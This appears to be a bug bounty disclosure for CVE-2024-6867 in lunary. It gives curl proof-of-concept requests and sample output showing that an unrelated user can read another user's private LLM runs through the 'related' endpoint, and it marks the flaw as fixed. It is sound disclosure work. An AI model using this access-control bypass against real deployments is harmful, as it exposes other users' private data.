@@ -1,0 +1,128 @@
+Title: Run info leak without valid authorization in lunary-ai/lunary
+
+Proof of Concept: 
+Create an user with private project key PRIVATE_KEYand project id PROJECT_ID, and log a run:
+
+curl --location 'http://localhost:3333/v1/runs/ingest/' \
+--header 'Authorization: Bearer PRIVATE_KEY' \
+--header 'Content-Type: application/json' \
+--data '{
+    "events": [
+        {
+            "projectId": "PROJECT_ID",
+            "type": "llm",
+            "event": "start",
+            "name": "gpt-3.5-turbo",
+            "timestamp": "2024-05-06T10:00:00Z",
+            "input": [{"role": "user", "text": "This is my parent run."}],
+            "tags": ["tag1"],
+            "tokensUsage": 400,
+            "runId": "parent_run"
+        }
+    ]
+}'
+
+And its child run:
+
+curl --location 'http://localhost:3333/v1/runs/ingest/' \
+--header 'Authorization: Bearer PRIVATE_KEY' \
+--header 'Content-Type: application/json' \
+--data '{
+    "events": [
+        {
+            "projectId": "PROJECT_ID",
+            "type": "llm",
+            "event": "start",
+            "name": "gpt-3.5-turbo",
+            "timestamp": "2024-05-06T16:00:00Z",
+            "input": [{"role": "user", "text": "This is my child run."}],
+            "tags": ["tag1"],
+            "tokensUsage": 400,
+            "runId": "child_run",
+            "parentRunId": "parent_run"
+        }
+    ]
+}'
+
+As a different (unrelated) user with auth (JWT) token AUTH_TOKEN, call the runs/{run_id}/related endpoint by using the UUID of the created parent run (see Impact for relevant ways on how this might be obtained):
+
+curl --location 'http://localhost:3333/v1/runs/RUN_UUID/related' \
+
+--header 'Authorization: Bearer AUTH_TOKEN'
+
+This will then return something like this:
+
+[
+    {
+        "createdAt": "2024-05-06T10:00:00.000Z",
+        "tags": [
+            "tag1"
+        ],
+        "projectId": "ddef0e22-f613-4ab0-9ad6-02bc3896c9c7",
+        "id": "3a278ce6-80ed-4401-abd3-9d397ab7c858",
+        "status": "started",
+        "name": "gpt-3.5-turbo",
+        "endedAt": null,
+        "error": null,
+        "input": [
+            {
+                "role": "user",
+                "text": "This is my parent run."
+            }
+        ],
+        "output": null,
+        "params": null,
+        "type": "llm",
+        "parentRunId": null,
+        "completionTokens": null,
+        "promptTokens": null,
+        "feedback": null
+    },
+    {
+        "createdAt": "2024-05-06T16:00:00.000Z",
+        "tags": [
+            "tag1"
+        ],
+        "projectId": "ddef0e22-f613-4ab0-9ad6-02bc3896c9c7",
+        "id": "4df5e85d-246d-4cfa-ad49-da9d26323517",
+        "status": "started",
+        "name": "gpt-3.5-turbo",
+        "endedAt": null,
+        "error": null,
+        "input": [
+            {
+            "role": "user",
+            "text": "This is my child run."
+            }
+        ],
+        "output": null,
+        "params": null,
+        "type": "llm",
+        "parentRunId": "3a278ce6-80ed-4401-abd3-9d397ab7c858",
+        "completionTokens": null,
+        "promptTokens": null,
+        "feedback": null
+    }
+]
+
+Impact: 
+This vulnerability makes it possible to get information about any non-public run given its run_id and runs that are related to it. One likely attack vector would be to get non-public runs that are related to a public parent run, since sharing the public parent run would include sharing its run_id.
+
+CVE ID: CVE-2024-6867
+Status: (published)
+Vulnerability Type: CWE-1220: Insufficient Granularity of Access Control
+Severity: Medium (4.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: Low
+User Interaction: None
+Scope: Unchanged
+Confidentiality: Low
+Integrity: None
+Availability: None
+Registry: Other
+Affected Version: branch main, commit a761d833
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $75
+Fix Bounty: $18.75
